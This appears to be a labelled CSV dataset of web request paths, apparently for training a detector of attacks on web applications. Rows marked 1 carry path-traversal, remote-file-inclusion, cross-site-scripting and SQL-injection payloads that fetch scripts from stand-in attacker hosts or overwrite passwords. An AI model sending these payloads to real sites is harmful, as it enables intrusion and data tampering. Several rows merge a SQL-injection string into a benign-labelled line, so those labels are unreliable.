/blog/our-proposals/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/files/js/editor.js/?file=http://evil.eu/sh,1
/core/files/js/editor.js/?post=%3script>alert(1);,1
/?post=%3script>alert(1);,1
/index.php/?file=http://evil.eu/sh,1
/index.php/?userid=bob'; update logintable set passwd='0wn3d';--/login.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/api/v1/customers/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/orders/?file=http://evil.eu/sh,1
/register.php/?post=%3script>alert(1);,1
/login.php/?file=http://evil.eu/sh,1
/orders.php/?userid=bob'; update logintable set passwd='0wn3d';--/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/themes/theme.inc/?file=http://evil.eu/sh,1
/api/v1/login/?file=http://evil.eu/sh,1
/connection.php/?post=%3script>alert(1);,1
/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/register/?post=%3script>alert(1);,1
/login.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/core/files/js/upload.js/?file=http://evil.eu/sh,1
/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/cgi-bin/count.cgi/?file=http://evil.eu/sh,1
/orders.php/?post=%3script>alert(1);,1
/?file=http://evil.eu/sh,1
/update.php/?file=http://evil.eu/sh,1
/api/v1/login/?post=%3script>alert(1);,1
/index.php/?post=%3script>alert(1);,1
/authorize.php/?post=%3script>alert(1);,1
/index.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/blog/better-products-for-2019/?file=http://evil.eu/root.asp,1
/orders.php/?file=http://evil.eu/sh,1
/index.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/login.php/?page=http://192.168.80.128/rfi.php,1
/core/themes/theme.inc/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/connection.php/?file=http://evil.eu/sh,1
/core/files/js/upload.js/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/register/?file=http://evil.eu/sh,1
/core/files/js/editor.js/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/login.php/?post=%3script>alert(1);,1
/register.php/?file=http://evil.eu/root.asp,1
/api/v1/register/?userid=bob'; update logintable set passwd='0wn3d';--/index.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/cgi-bin/count.cgi/?post=%3script>alert(1);,1
/api/v1/orders/?post=%3script>alert(1);,1
/api/v1/login/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/register.php/?file=http://evil.eu/sh,1
/orders.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/?userid=bob'; update logintable set passwd='0wn3d';--/?file=http://evil.eu/root.asp,1
/cgi-bin/count.cgi/?file=http://evil.eu/root.asp,1
/api/v1/customers/?file=http://evil.eu/root.asp,1
/cgi-bin/count.cgi/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/connection.php/?page=http://192.168.80.128/rfi.php,1
/api/v1/customers/?post=%3script>alert(1);,1
/orders.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/connection.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/themes/theme.inc/?post=%3script>alert(1);,1
/register.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/api/v1/orders/?page=http://192.168.80.128/rfi.php,1
/update.php/?post=%3script>alert(1);,1
/register.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/index.php/?file=http://evil.eu/root.asp,1
/api/v1/register/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/blog/our-proposals/?file=http://evil.eu/sh,1
/xmlrpc.php/?post=%3script>alert(1);,1
/login.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/orders.php/?page=http://192.168.80.128/rfi.php,1
/core/files/js/editor.js/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/authorize.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/orders/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/orders/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/page/about-us/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/authorize.php/?file=http://evil.eu/sh,1
/api/v1/customers/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/files/js/editor.js/?page=http://192.168.80.128/rfi.php,1
/orders.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/page/about-us/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/register/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/register/?page=http://192.168.80.128/rfi.php,1
/connection.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/orders/?file=http://evil.eu/root.asp,1
/api/v1/register/?file=http://evil.eu/root.asp,1
/core/files/js/upload.js/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/api/v1/customers/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/page/about-us/?post=%3script>alert(1);,1
/api/v1/customers/?file=http://evil.eu/sh,1
/core/files/js/upload.js/?post=%3script>alert(1);,1
/update.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/files/js/upload.js/?file=http://evil.eu/root.asp,1
/blog/how-to-shop/?post=%3script>alert(1);,1
/orders.php/?file=http://evil.eu/root.asp,1
/api/v1/login/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/login/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/core/files/js/editor.js/?file=http://evil.eu/root.asp,1
/update.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/login/?file=http://evil.eu/root.asp,1
/api/v1/orders/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/blog/better-products-for-2019/?file=http://evil.eu/sh,1
/page/about-us/?file=http://evil.eu/sh,1
/index.php/?page=http://192.168.80.128/rfi.php,1
/core/files/js/upload.js/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/?page=http://192.168.80.128/rfi.php,1
/core/files/js/editor.js/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/core/themes/theme.inc/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/blog/how-to-shop/?file=http://evil.eu/sh,1
/blog/better-products-for-2019/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/register/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/login/?page=http://192.168.80.128/rfi.php,1
/core/themes/theme.inc/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/connection.php/?file=http://evil.eu/root.asp,1
/core/themes/theme.inc/?file=http://evil.eu/root.asp,1
/blog/how-to-shop/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/blog/our-proposals/?post=%3script>alert(1);,1
/cgi-bin/count.cgi/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/update.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/register.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/authorize.php/?page=http://192.168.80.128/rfi.php,1
/blog/our-proposals/?page=http://192.168.80.128/rfi.php,1
/update.php/?file=http://evil.eu/root.asp,1
/login.php/?file=http://evil.eu/root.asp,1
/cgi-bin/count.cgi/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/authorize.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/blog/our-proposals/?file=http://evil.eu/root.asp,1
/register.php/?page=http://192.168.80.128/rfi.php,1
/xmlrpc.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/core/files/js/upload.js/?page=http://192.168.80.128/rfi.php,1
/blog/better-products-for-2019/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/xmlrpc.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/xmlrpc.php/?file=http://evil.eu/root.asp,1
/blog/how-to-shop/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/authorize.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/page/about-us/?file=http://evil.eu/root.asp,1
/xmlrpc.php/?file=http://evil.eu/sh,1
/blog/how-to-shop/?file=http://evil.eu/root.asp,1
/update.php/?page=http://192.168.80.128/rfi.php,1
/page/about-us/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/customers/?page=http://192.168.80.128/rfi.php,1
/page/about-us/?page=http://192.168.80.128/rfi.php,1
/connection.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/blog/better-products-for-2019/?post=%3script>alert(1);,1
/blog/better-products-for-2019/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/blog/how-to-shop/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/blog/our-proposals/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/core/themes/theme.inc/?page=http://192.168.80.128/rfi.php,1
/blog/how-to-shop/?page=http://192.168.80.128/rfi.php,1
/xmlrpc.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/xmlrpc.php/?page=http://192.168.80.128/rfi.php,1
/authorize.php/?file=http://evil.eu/root.asp,1
/cgi-bin/count.cgi/?page=http://192.168.80.128/rfi.php,1
/api/v1/login/?username=admin&password=1234,0
/orders.php/?username=admin&password=1239,0
/api/v1/orders/?,0
/?,0
/index.php/?username=admin&password=password,0
/orders.php/?username=admin&password=1237,0
/api/v1/register/?username=admin&password=1237,0
/blog/our-proposals/?,0
/api/v1/register/.env/README.txt?,0
/core/files/js/upload.js/?,0
/api/v1/login/?,0
/cgi-bin/count.cgi/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/index.php/?username=admin&password=1235,0
/?username=admin&password=admin,0
/page/about-us/?,0
/?username=admin&password=1237,0
/register.php/?username=admin&password=admin2,0
/api/v1/login/?username=admin&password=1238,0
/a?[buffer]=89898,0
/?username=admin&password=password,0
/orders.php/?username=admin&password=admin,0
/authorize.php/?,0
/core/files/js/editor.js/?username=admin&password=1234,0
/connection.php/?username=admin&password=password,0
/index.php/?,0
/?username=admin&password=1239,0
/login.php/?,0
/cgi-bin/count.cgi/?,0
/api/v1/customers/?userid=bob'; update logintable set passwd='0wn3d';--/page/about-us/?username=admin&password=1237,0
/index.php/?username=admin&password=1239,0
/index.php/?username=admin&password=1238,0
/login.php/?username=admin&password=1239,0
/login.php/?userid=bob'; update logintable set passwd='0wn3d';--/api/v1/register/?,0
/api/v1/login/?username=admin&password=1237,0
/core/themes/theme.inc/?,0
/register.php/?,0
/core/files/js/editor.js/?,0
/update.php/?,0
/api/v1/register/?username=admin&password=1234,0
/api/v1/customers/.well-known/assetlinks.json?,0
/api/v1/customers/?session=vwdefcwec334scfdjr49ccededfewsd,0
/update.php/?username=admin&password=1238,0
/core/files/js/upload.js/?username=admin&password=1238,0
/connection.php/?,0
/core/files/js/editor.js/?username=admin&password=1235,0
/login.php/?username=admin&password=1235,0
/?username=admin&password=admin2,0
/core/files/js/upload.js/?username=admin&password=admin2,0
/authorize.php/?username=admin&password=1234,0
/core/files/js/editor.js/?username=admin&password=password,0
/?username=admin&password=1238,0
/orders.php/?,0
/api/v1/customers/?,0
/api/v1/login/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/login.php/?username=admin&password=1234,0
/register.php/?username=admin&password=1238,0
/?username=admin&password=1234,0
/orders.php/.env/README.txt?,0
/login.php/?username=admin&password=1236,0
/blog/our-proposals/a?[buffer]=89898,0
/index.php/?username=admin&password=admin,0
/connection.php/?username=admin&password=1237,0
/login.php/?username=admin&password=password,0
/orders.php/?username=admin&password=1234,0
/api/v1/register/?username=admin&password=1239,0
/blog/how-to-shop/?,0
/index.php/?username=admin&password=1237,0
/update.php/?username=admin&password=password,0
/orders.php/?username=admin&password=1235,0
/core/files/js/upload.js/a?[buffer]=89898,0
/api/v1/login/a?[buffer]=89898,0
/register.php/?username=admin&password=1237,0
/api/v1/register/a?[buffer]=89898,0
/api/v1/register/?username=admin&password=1236,0
/login.php/.well-known/assetlinks.json?,0
/api/v1/register/?username=admin&password=password,0
/core/files/js/editor.js/?username=admin&password=1239,0
/.well-known/assetlinks.json?,0
/index.php/a?[buffer]=89898,0
/login.php/?user=admin&amount=100000,0
/login.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/api/v1/login/?username=admin&password=admin,0
/register.php/?user=admin&amount=100000,0
/login.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/update.php/?userid=bob'; update logintable set passwd='0wn3d';--/orders.php/a?[buffer]=89898,0
/index.php/?username=admin&password=1234,0
/index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/register.php/.env/README.txt?,0
/api/v1/login/.well-known/assetlinks.json?,0
/core/files/js/upload.js/?session=vwdefcwec334scfdjr49ccededfewsd,0
/index.php/?username=admin&password=admin2,0
/api/v1/orders/.env/README.txt?,0
/connection.php/?username=admin&password=admin,0
/index.php/?username=admin&password=1236,0
/core/files/js/upload.js/?username=admin&password=1239,0
/register.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/xmlrpc.php/?,0
/api/v1/customers/?username=admin&password=1234,0
/core/themes/theme.inc/?username=admin&password=1236,0
/api/v1/login/?username=admin&password=password,0
/login.php/a?[buffer]=89898,0
/index.php/.env/README.txt?,0
/update.php/.well-known/assetlinks.json?,0
/update.php/?username=admin&password=admin2,0
/connection.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/register.php/?userid=bob'; update logintable set passwd='0wn3d';--/core/themes/theme.inc/?username=admin&password=admin2,0
/update.php/?username=admin&password=1239,0
/?username=admin&password=1236,0
/connection.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/core/files/js/upload.js/?username=admin&password=1234,0
/connection.php/?username=admin&password=admin2,0
/authorize.php/?userid=bob'; update logintable set passwd='0wn3d';--/?user=admin&amount=100000,0
/api/v1/login/.env/README.txt?,0
/login.php/.env/README.txt?,0
/connection.php/?username=admin&password=1236,0
/connection.php/a?[buffer]=89898,0
/api/v1/customers/?username=admin&password=1237,0
/update.php/?username=admin&password=1235,0
/register.php/.well-known/assetlinks.json?,0
/core/files/js/upload.js/.well-known/assetlinks.json?,0
/login.php/?username=admin&password=1238,0
/index.php/?user=admin&amount=100000,0
/api/v1/customers/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/register.php/?username=admin&password=1234,0
/page/about-us/?username=admin&password=1234,0
/login.php/?username=admin&password=1237,0
/api/v1/login/?username=admin&password=admin2,0
/cgi-bin/count.cgi/?username=admin&password=password,0
/api/v1/register/.well-known/assetlinks.json?,0
/?username=admin&password=1235,0
/authorize.php/?username=admin&password=1239,0
/core/files/js/upload.js/?username=admin&password=1235,0
/blog/our-proposals/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/customers/?user=admin&amount=100000,0
/authorize.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/core/files/js/editor.js/?username=admin&password=admin,0
/core/files/js/editor.js/.well-known/assetlinks.json?,0
/api/v1/orders/?username=admin&password=admin2,0
/login.php/?username=admin&password=admin2,0
/register.php/?username=admin&password=1239,0
/api/v1/orders/?username=admin&password=1235,0
/connection.php/?username=admin&password=1234,0
/orders.php/?username=admin&password=admin2,0
/orders.php/?username=admin&password=1238,0
/api/v1/register/?username=admin&password=1238,0
/core/files/js/editor.js/a?[buffer]=89898,0
/api/v1/orders/.well-known/assetlinks.json?,0
/cgi-bin/count.cgi/?user=admin&amount=100000,0
/register.php/?username=admin&password=password,0
/api/v1/customers/.env/README.txt?,0
/xmlrpc.php/?username=admin&password=1238,0
/blog/better-products-for-2019/?username=admin&password=1237,0
/orders.php/?username=admin&password=password,0
/?session=vwdefcwec334scfdjr49ccededfewsd,0
/update.php/?user=admin&amount=100000,0
/update.php/.env/README.txt?,0
/api/v1/login/?username=admin&password=1236,0
/blog/our-proposals/?username=admin&password=password,0
/xmlrpc.php/?userid=bob'; update logintable set passwd='0wn3d';--/connection.php/.env/README.txt?,0
/orders.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/register/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/core/files/js/editor.js/?username=admin&password=1237,0
/cgi-bin/count.cgi/?username=admin&password=1235,0
/register.php/?username=admin&password=1235,0
/index.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/api/v1/customers/a?[buffer]=89898,0
/core/themes/theme.inc/?username=admin&password=1239,0
/authorize.php/?username=admin&password=1235,0
/update.php/?username=admin&password=1234,0
/connection.php/.well-known/assetlinks.json?,0
/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/better-products-for-2019/?username=admin&password=1234,0
/core/files/js/editor.js/?session=vwdefcwec334scfdjr49ccededfewsd,0
/api/v1/login/?username=admin&password=1235,0
/blog/better-products-for-2019/?,0
/core/themes/theme.inc/?username=admin&password=password,0
/api/v1/register/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/orders/?username=admin&password=1237,0
/core/files/js/upload.js/?username=admin&password=1237,0
/blog/better-products-for-2019/.env/README.txt?,0
/connection.php/?user=admin&amount=100000,0
/page/about-us/.well-known/assetlinks.json?,0
/login.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/login/?username=admin&password=1239,0
/core/files/js/upload.js/?userid=bob'; update logintable set passwd='0wn3d';--/core/files/js/editor.js/?username=admin&password=admin2,0
/api/v1/customers/?username=admin&password=password,0
/blog/how-to-shop/?username=admin&password=1235,0
/core/themes/theme.inc/?username=admin&password=1238,0
/blog/how-to-shop/?username=admin&password=1238,0
/index.php/.well-known/assetlinks.json?,0
/core/files/js/upload.js/?user=admin&amount=100000,0
/update.php/a?[buffer]=89898,0
/api/v1/customers/?username=admin&password=1236,0
/core/files/js/upload.js/?username=admin&password=password,0
/update.php/?username=admin&password=1237,0
/login.php/?username=admin&password=admin,0
/core/files/js/upload.js/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/update.php/?username=admin&password=1236,0
/page/about-us/.env/README.txt?,0
/core/files/js/editor.js/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/login/?user=admin&amount=100000,0
/xmlrpc.php/?user=admin&amount=100000,0
/blog/how-to-shop/a?[buffer]=89898,0
/orders.php/?username=admin&password=1236,0
/api/v1/customers/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/core/files/js/upload.js/?username=admin&password=admin,0
/core/themes/theme.inc/?username=admin&password=1237,0
/register.php/?username=admin&password=1236,0
/.env/README.txt?,0
/api/v1/customers/?username=admin&password=admin2,0
/api/v1/customers/?username=admin&password=1235,0
/connection.php/?username=admin&password=1239,0
/api/v1/login/?session=vwdefcwec334scfdjr49ccededfewsd,0
/connection.php/?username=admin&password=1235,0
/register.php/a?[buffer]=89898,0
/cgi-bin/count.cgi/?username=admin&password=1236,0
/core/files/js/upload.js/?username=admin&password=1236,0
/index.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/page/about-us/?username=admin&password=1236,0
/xmlrpc.php/?username=admin&password=1234,0
/api/v1/customers/?username=admin&password=1238,0
/page/about-us/?username=admin&password=1235,0
/cgi-bin/count.cgi/?username=admin&password=admin,0
/cgi-bin/count.cgi/?userid=bob'; update logintable set passwd='0wn3d';--/blog/better-products-for-2019/?user=admin&amount=100000,0
/core/files/js/editor.js/?username=admin&password=1238,0
/register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/page/about-us/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/cgi-bin/count.cgi/?username=admin&password=1237,0
/update.php/?username=admin&password=admin,0
/cgi-bin/count.cgi/?username=admin&password=admin2,0
/xmlrpc.php/a?[buffer]=89898,0
/authorize.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/better-products-for-2019/?username=admin&password=admin2,0
/blog/how-to-shop/?username=admin&password=1239,0
/api/v1/register/?username=admin&password=admin2,0
/api/v1/orders/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/orders/?username=admin&password=1234,0
/blog/our-proposals/?username=admin&password=admin2,0
/core/files/js/editor.js/.env/README.txt?,0
/api/v1/register/?username=admin&password=1235,0
/blog/how-to-shop/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/login/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/core/themes/theme.inc/?username=admin&password=1234,0
/core/files/js/editor.js/?username=admin&password=1236,0
/blog/how-to-shop/.env/README.txt?,0
/core/files/js/upload.js/.env/README.txt?,0
/core/files/js/editor.js/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/orders/?username=admin&password=1238,0
/xmlrpc.php/.env/README.txt?,0
/api/v1/orders/?username=admin&password=1239,0
/register.php/?username=admin&password=admin,0
/orders.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/connection.php/?username=admin&password=1238,0
/blog/how-to-shop/?username=admin&password=password,0
/api/v1/orders/?username=admin&password=admin,0
/core/themes/theme.inc/a?[buffer]=89898,0
/cgi-bin/count.cgi/?username=admin&password=1238,0
/authorize.php/.well-known/assetlinks.json?,0
/blog/how-to-shop/?username=admin&password=admin,0
/api/v1/register/?username=admin&password=admin,0
/xmlrpc.php/?username=admin&password=admin,0
/authorize.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/how-to-shop/?username=admin&password=1236,0
/api/v1/orders/?username=admin&password=1236,0
/orders.php/.well-known/assetlinks.json?,0
/core/themes/theme.inc/?userid=bob'; update logintable set passwd='0wn3d';--/api/v1/register/?user=admin&amount=100000,0
/orders.php/?user=admin&amount=100000,0
/core/themes/theme.inc/?user=admin&amount=100000,0
/blog/our-proposals/.well-known/assetlinks.json?,0
/blog/our-proposals/?userid=bob'; update logintable set passwd='0wn3d';--/authorize.php/a?[buffer]=89898,0
/cgi-bin/count.cgi/?username=admin&password=1234,0
/core/themes/theme.inc/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/update.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/customers/?username=admin&password=admin,0
/core/files/js/editor.js/?user=admin&amount=100000,0
/page/about-us/?username=admin&password=1238,0
/page/about-us/?session=vwdefcwec334scfdjr49ccededfewsd,0
/api/v1/orders/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/core/themes/theme.inc/.env/README.txt?,0
/authorize.php/?username=admin&password=password,0
/blog/how-to-shop/?user=admin&amount=100000,0
/blog/better-products-for-2019/.well-known/assetlinks.json?,0
/api/v1/orders/a?[buffer]=89898,0
/authorize.php/?username=admin&password=1236,0
/update.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/our-proposals/?username=admin&password=1234,0
/blog/our-proposals/?username=admin&password=1235,0
/blog/better-products-for-2019/?username=admin&password=1235,0
/api/v1/orders/?username=admin&password=password,0
/register.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/authorize.php/?username=admin&password=1237,0
/blog/how-to-shop/?username=admin&password=1234,0
/update.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/api/v1/customers/?username=admin&password=1239,0
/xmlrpc.php/?username=admin&password=admin2,0
/api/v1/register/?session=vwdefcwec334scfdjr49ccededfewsd,0
/authorize.php/.env/README.txt?,0
/xmlrpc.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/connection.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/page/about-us/?username=admin&password=admin2,0
/authorize.php/?username=admin&password=1238,0
/page/about-us/?username=admin&password=1239,0
/orders.php/?session=vwdefcwec334scfdjr49ccededfewsd,0
/page/about-us/?username=admin&password=admin,0
/core/themes/theme.inc/.well-known/assetlinks.json?,0
/xmlrpc.php/?username=admin&password=1239,0
/cgi-bin/count.cgi/.env/README.txt?,0
/xmlrpc.php/?username=admin&password=1236,0
/blog/how-to-shop/?username=admin&password=admin2,0
/core/themes/theme.inc/?username=admin&password=1235,0
/page/about-us/?username=admin&password=password,0
/core/files/js/upload.js/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/cgi-bin/count.cgi/?username=admin&password=1239,0
/xmlrpc.php/?username=admin&password=1235,0
/blog/better-products-for-2019/?username=admin&password=1238,0
/core/themes/theme.inc/?username=admin&password=admin,0
/xmlrpc.php/?username=admin&password=password,0
/blog/better-products-for-2019/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/api/v1/orders/?user=admin&amount=100000,0
/blog/our-proposals/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/better-products-for-2019/?session=vwdefcwec334scfdjr49ccededfewsd,0
/authorize.php/?user=admin&amount=100000,0
/authorize.php/?username=admin&password=admin2,0
/blog/our-proposals/?username=admin&password=1236,0
/blog/how-to-shop/?username=admin&password=1237,0
/blog/how-to-shop/.well-known/assetlinks.json?,0
/blog/better-products-for-2019/?username=admin&password=1236,0
/xmlrpc.php/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/cgi-bin/count.cgi/a?[buffer]=89898,0
/api/v1/orders/?session=vwdefcwec334scfdjr49ccededfewsd,0
/xmlrpc.php/?username=admin&password=1237,0
/blog/better-products-for-2019/?username=admin&password=admin,0
/blog/how-to-shop/?session=vwdefcwec334scfdjr49ccededfewsd,0
/xmlrpc.php/.well-known/assetlinks.json?,0
/blog/our-proposals/?username=admin&password=1238,0
/page/about-us/a?[buffer]=89898,0
/core/themes/theme.inc/?session=vwdefcwec334scfdjr49ccededfewsd,0
/authorize.php/?username=admin&password=admin,0
/blog/our-proposals/?user=admin&amount=100000,0
/cgi-bin/count.cgi/?session=vwdefcwec334scfdjr49ccededfewsd,0
/blog/our-proposals/.env/README.txt?,0
/blog/our-proposals/?username=admin&password=1237,0
/blog/better-products-for-2019/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/cgi-bin/count.cgi/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/better-products-for-2019/?username=admin&password=1239,0
/cgi-bin/count.cgi/.well-known/assetlinks.json?,0
/xmlrpc.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00,0
/blog/our-proposals/?username=admin&password=1239,0
/blog/how-to-shop/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/blog/better-products-for-2019/a?[buffer]=89898,0
/blog/our-proposals/?session=duf8423ufdjr49cce3ije33ssaq2223,0
/blog/our-proposals/?username=admin&password=admin,0
/page/about-us/?user=admin&amount=100000,0
/blog/better-products-for-2019/?username=admin&password=password,0
/core/themes/theme.inc/?session=duf8423ufdjr49cce3ije33ssaq2223,0
